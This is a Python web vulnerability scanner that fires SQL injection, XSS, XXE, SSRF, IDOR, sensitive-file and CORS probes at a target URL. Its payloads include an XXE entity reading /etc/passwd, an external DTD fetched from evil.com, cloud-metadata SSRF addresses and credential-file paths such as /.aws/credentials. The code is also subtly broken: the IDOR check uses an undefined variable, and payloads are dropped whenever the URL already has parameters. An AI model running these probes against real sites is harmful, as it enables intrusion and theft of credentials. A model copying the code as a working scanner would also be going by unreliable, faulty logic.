import requests
import re
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, parse_qs, urlparse

class VulnerabilityScanner:
    def __init__(self, navigator=None):
        self.navigator = navigator
        self.findings = []
        
    def scan_sqli(self, url, params=None):
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' AND '1'='1",
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '00:00:05'--"
        ]
        findings = []
        for payload in sqli_payloads:
            try:
                test_params = params.copy() if params else {"q": payload}
                resp = requests.get(url, params=test_params, timeout=10)
                if "sql" in resp.text.lower() or "syntax" in resp.text.lower():
                    findings.append({
                        "type": "SQLi",
                        "url": url,
                        "payload": payload,
                        "evidence": "Error detected"
                    })
            except:
                pass
        return findings
        
    def scan_xss(self, url, params=None):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>"
        ]
        findings = []
        for payload in xss_payloads:
            try:
                test_params = params.copy() if params else {"q": payload}
                resp = requests.get(url, params=test_params, timeout=10)
                if payload in resp.text:
                    findings.append({
                        "type": "XSS",
                        "url": url,
                        "payload": payload,
                        "reflected": True
                    })
            except:
                pass
        return findings
        
    def scan_xxe(self, url):
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
        ]
        findings = []
        for payload in xxe_payloads:
            try:
                resp = requests.post(url, data=payload.encode(), timeout=10)
                if "root" in resp.text or "SYSTEM" in resp.text:
                    findings.append({
                        "type": "XXE",
                        "url": url,
                        "payload": payload[:50]
                    })
            except:
                pass
        return findings
        
    def scan_ssrf(self, url, param_name="url"):
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254",
            "http://metadata.google.internal"
        ]
        findings = []
        for payload in ssrf_payloads:
            try:
                params = {param_name: payload}
                resp = requests.get(url, params=params, timeout=10)
                if "localhost" in resp.text or "127.0.0.1" in resp.text:
                    findings.append({
                        "type": "SSRF",
                        "url": url,
                        "payload": payload
                    })
            except:
                pass
        return findings
        
    def scan_idor(self, url, param="id"):
        for i in range(1, 20):
            try:
                params = {param: str(i)}
                resp = requests.get(url, params=params, timeout=10)
                if resp.status_code == 200:
                    findings.append({
                        "type": "IDOR",
                        "url": url,
                        "parameter": param,
                        "tested_value": str(i)
                    })
            except:
                pass
        return findings
        
    def scan_sensitive_files(self, url):
        sensitive_paths = [
            "/.git/config",
            "/.env",
            "/wp-config.php",
            "/config.php",
            "/admin.php",
            "/phpinfo.php",
            "/server-status",
            "/.DS_Store",
            "/backup.zip",
            "/Database.sql",
            "/api/config",
            "/.aws/credentials"
        ]
        findings = []
        for path in sensitive_paths:
            try:
                full_url = urljoin(url, path)
                resp = requests.get(full_url, timeout=5)
                if resp.status_code == 200 and len(resp.text) > 0:
                    if "root:" in resp.text or "database" in resp.text.lower():
                        findings.append({
                            "type": "Sensitive_File",
                            "url": full_url,
                            "status": resp.status_code
                        })
            except:
                pass
        return findings
        
    def scan_cors(self, url):
        headers = {"Origin": "https://evil.com"}
        try:
            resp = requests.get(url, headers=headers, timeout=10)
            acao = resp.headers.get("Access-Control-Allow-Origin")
            if acao == "*" or acao == "https://evil.com":
                return [{"type": "CORS", "url": url, "acao": acao}]
        except:
            pass
        return []
        
    def full_scan(self, url):
        all_findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query) if parsed.query else None
        
        all_findings.extend(self.scan_sqli(url, params))
        all_findings.extend(self.scan_xss(url, params))
        all_findings.extend(self.scan_ssrf(url))
        all_findings.extend(self.scan_sensitive_files(url))
        all_findings.extend(self.scan_cors(url))
        
        self.findings = all_findings
        return all_findings

scanner = VulnerabilityScanner()